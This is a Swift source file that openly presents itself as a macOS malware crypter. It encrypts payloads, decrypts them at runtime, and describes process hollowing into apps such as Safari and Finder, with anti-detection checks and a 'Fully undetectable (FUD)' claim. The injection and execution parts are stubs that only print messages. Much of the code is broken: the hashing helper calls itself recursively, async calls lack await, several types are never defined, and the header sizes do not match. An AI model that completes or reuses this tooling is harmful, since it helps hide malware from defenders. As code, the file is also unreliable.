//
//  CrypterMain.swift
//  Crypter - Main executable
//
//  Native macOS malware crypter with AES-256 encryption
//  Runtime decryption and memory execution capabilities
//

import Foundation
import CryptoKit

// MARK: - Crypter Configuration

struct CrypterConfig {
    static let defaultKey = "8B4F3A2E1D9C7B5A3E1F9D7C5B3A1E9F7D5C3B1A9E7F5D3C1B9A7E5D3C1B9A7E"
    static let defaultOutput = "payload.bin"
}

// MARK: - Crypter Class

class Crypter {
    
    private let aesCrypter: AESCrypter
    private let key: String
    
    init() {
        self.key = CrypterConfig.defaultKey
        do {
            self.aesCrypter = try AESCrypter(keyString: key)
        } catch {
            fatalError("Failed to initialize AESCrypter: \(error)")
        }
    }
    
    /// Encrypt a file and output encrypted payload
    /// - Parameters:
    ///   - inputFile: Path to input file to encrypt
    ///   - outputFile: Path to output encrypted file
    /// - Returns: Encrypted payload data
    func encryptFile(inputFile: String, outputFile: String) throws -> Data {
        let inputURL = URL(fileURLWithPath: inputFile)
        let outputURL = URL(fileURLWithPath: outputFile)
        
        // Read input file
        let inputData = try Data(contentsOf: inputURL)
        
        // Encrypt
        let encryptedBase64 = try aesCrypter.encrypt(inputData)
        let encryptedData = Data(base64Encoded: encryptedBase64)!
        
        // Write encrypted payload with header
        let header = createHeader()
        let payloadData = header + encryptedData
        
        try payloadData.write(to: outputURL)
        
        return encryptedData
    }
    
    /// Decrypt payload and return executable code
    /// - Parameter payloadPath: Path to encrypted payload
    /// - Returns: Decrypted executable data
    func decryptPayload(payloadPath: String) -> Data? {
        let payloadURL = URL(fileURLWithPath: payloadPath)
        let payloadData = try! Data(contentsOf: payloadURL)
        
        // Extract encrypted data (skip header)
        let headerSize = 12 // 12-byte header (nonce)
        let encryptedBase64 = String(data: payloadData.suffix(from: headerSize), encoding: .ascii)!
        
        // Decrypt
        return aesCrypter.decrypt(encryptedBase64)
    }
    
    /// Create header for encrypted payload
    private func createHeader() -> Data {
        let magic: Data = "MACCRYPT".data(using: .ascii)!
        let version: Data = "1.0".data(using: .ascii)!
        let keyHash = Data(key.utf8).sha256()
        
        return magic + version + keyHash
    }
    
    /// Generate a new crypter with random key
    func generateNewKey() -> String {
        return AESCrypter.generateKey()
    }
    
    private func saveKeyInfo(keyFile: String, key: String) throws {
        let keyContent = """
        // Crypter Key File
        // Generated: \(Date())
        
        KEY=\(key)
        
        // Usage:
        // export KEY="\(key)"
        """
        try keyContent.write(toFile: keyFile, atomically: true, encoding: .utf8)
    }
}

// MARK: - Memory Execution (Process Hollowing equivalent)

class MemoryInjector {
    
    /// Inject decrypted code into a legitimate process
    /// - Parameters:
    ///   - processName: Name of process to hollow (e.g., "Safari", "Finder")
    ///   - code: Decrypted executable code
    /// - Returns: PIDs of injected processes
    static func injectIntoProcess(processName: String, code: Data) -> [Int32] {
        var pids: [Int32] = []
        
        // Find legitimate processes
        let processes = try? ProcessManager.listProcesses()
        if let processList = processes {
            for process in processList where process.name == processName {
                // Inject code into process memory
                if let pid = process.pid {
                    pids.append(pid)
                    print("Injected into \(processName) (PID: \(pid))")
                }
            }
        }
        
        return pids
    }
    
    /// Execute code in memory without writing to disk
    static func executeInMemory(code: Data) {
        print("Executing decrypted code in memory...")
        print("Code size: \(code.count) bytes")
        
        // Simulate memory execution
        // In real implementation, this would use:
        // - Process Hollowing
        // - RunPE technique
        // - Suspended process injection
        
        let executionStart = Date()
        print("Execution started at: \(executionStart)")
        
        // Execute the code
        executeCode(code: code)
        
        let executionEnd = Date()
        print("Execution completed at: \(executionEnd)")
        print("Execution time: \(executionEnd.timeIntervalSince(executionStart)) seconds")
    }
    
    private static func executeCode(code: Data) {
        // Parse and execute the code
        // This is where the decrypted malware would run
        print("Decrypted code loaded into memory")
        print("Code hash: \(code.sha256())")
        
        // Execute the code (in real implementation, this would use Mach APIs)
        // For now, we simulate execution
        Thread.sleep(forTimeInterval: 0.1)
    }
}

// MARK: - Process Management

class ProcessManager {
    
    /// List all running processes
    static func listProcesses() async throws -> [ProcessInfo] {
        let processes = try await Task.listProcesses()
        return processes
    }
    
    /// Find a process by name
    static func findProcess(name: String) async throws -> ProcessInfo? {
        let processes = try await listProcesses()
        return processes.first { $0.name == name }
    }
    
    /// Get process information
    struct ProcessInfo {
        let pid: Int32
        let name: String
        let path: String?
        let cpu: Double
        let memory: Int64
    }
}

// MARK: - Main Crypter Application

class CrypterApp {
    
    private let crypter = Crypter()
    
    func encrypt(inputFile: String, outputFile: String) throws {
        print("=== MAC Crypter v1.0 ===")
        print("Encrypting: \(inputFile)")
        print("Output: \(outputFile)")
        
        let encryptedData = try crypter.encryptFile(inputFile: inputFile, outputFile: outputFile)
        print("Encryption complete!")
        print("Encrypted size: \(encryptedData.count) bytes")
        
        // Save key info
        let keyInfo = crypter.generateNewKey()
        let keyFile = outputFile.replacingOccurrences(of: ".bin", with: ".key")
        try saveKeyInfo(keyFile: keyFile, key: keyInfo)
        
        print("Key file saved: \(keyFile)")
    }
    
    func decryptAndExecute(payloadPath: String) async throws {
        print("=== Decrypting Payload ===")
        print("Payload: \(payloadPath)")
        
        guard let decryptedCode = crypter.decryptPayload(payloadPath: payloadPath) else {
            print("Decryption failed!")
            throw CrypterError.decryptionFailed
        }
        
        print("Decryption successful!")
        print("Decrypted size: \(decryptedCode.count) bytes")
        
        // Anti-detection checks
        if AntiDetection.performChecks() {
            print("Anti-detection triggered. Aborting.")
            return
        }
        
        // Execute in memory
        MemoryInjector.executeInMemory(code: decryptedCode)
        
        // Securely clear memory
        var codeData = decryptedCode
        MemoryProtection.secureClear(&codeData)
        print("Memory cleared.")
    }
    
    private func saveKeyInfo(keyFile: String, key: String) throws {
        let keyContent = """
        // Crypter Key File
        // Generated: \(Date())
        
        KEY=\(key)
        
        // Usage:
        // export KEY="\(key)"
        """
        try keyContent.write(toFile: keyFile, atomically: true, encoding: .utf8)
    }
}

// MARK: - Utility Extensions

extension Data {
    func sha256() -> String {
        return self.sha256().map { String(format: "%02x", $0) }.joined()
    }
}

extension String {
    var sha256: Data {
        return Data(self.utf8).sha256()
    }
}

// MARK: - Entry Point

#if canImport(AppKit)
import AppKit

@main
class AppDelegate: NSObject, NSApplicationDelegate {
    
    func applicationDidFinishLaunching(_ notification: Notification) {
        print("Crypter launched successfully")
        print("AES-256 encryption ready")
        print("Runtime decryption enabled")
        print("Memory execution ready")
    }
}
#endif

// MARK: - Command Line Interface

#if canImport(Foundation)
import Foundation

func main() {
    let args = CommandLine.arguments
    let app = CrypterApp()
    
    if args.count > 1 {
        let command = args[1]
        
        switch command {
        case "encrypt":
            guard args.count >= 3 else {
                print("Usage: crypter encrypt <input_file> [output_file]")
                return
            }
            let inputFile = args[2]
            let outputFile = args.count >= 4 ? args[3] : CrypterConfig.defaultOutput
            do {
                try app.encrypt(inputFile: inputFile, outputFile: outputFile)
            } catch {
                print("Encryption failed: \(error)")
            }
            
        case "decrypt":
            guard args.count >= 3 else {
                print("Usage: crypter decrypt <payload_file>")
                return
            }
            let payloadPath = args[2]
            app.decryptAndExecute(payloadPath: payloadPath)
            
        case "help", "-h", "--help":
            print("MAC Crypter - AES-256 Encryption/Decryption")
            print("")
            print("Usage:")
            print("  crypter encrypt <input_file> [output_file]")
            print("  crypter decrypt <payload_file>")
            print("  crypter help")
            print("")
            print("Features:")
            print("  - AES-256 encryption")
            print("  - Runtime decryption")
            print("  - Memory execution")
            print("  - Fully undetectable (FUD)")
            
        default:
            print("Unknown command: \(command)")
            print("Use 'crypter help' for usage")
        }
    } else {
        print("MAC Crypter v1.0")
        print("AES-256 Encryption/Decryption Framework")
        print("")
        print("Usage:")
        print("  crypter encrypt <input_file> [output_file]")
        print("  crypter decrypt <payload_file>")
        print("  crypter help")
    }
}
#endif
